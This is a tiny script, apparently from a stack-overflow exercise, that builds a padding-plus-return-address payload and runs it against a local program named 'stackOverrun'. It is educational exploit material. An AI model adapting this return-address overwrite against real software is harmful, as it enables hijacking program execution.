#$arg = "ABCDEFGHIJKLMNOP"."\x90\x11\x40";
$arg = "aaaaaaaaaaaaaaaaaa\xe9\x51\x55\x55\x55\x55";
$cmd = "./stackOverrun ".$arg;

system($cmd);

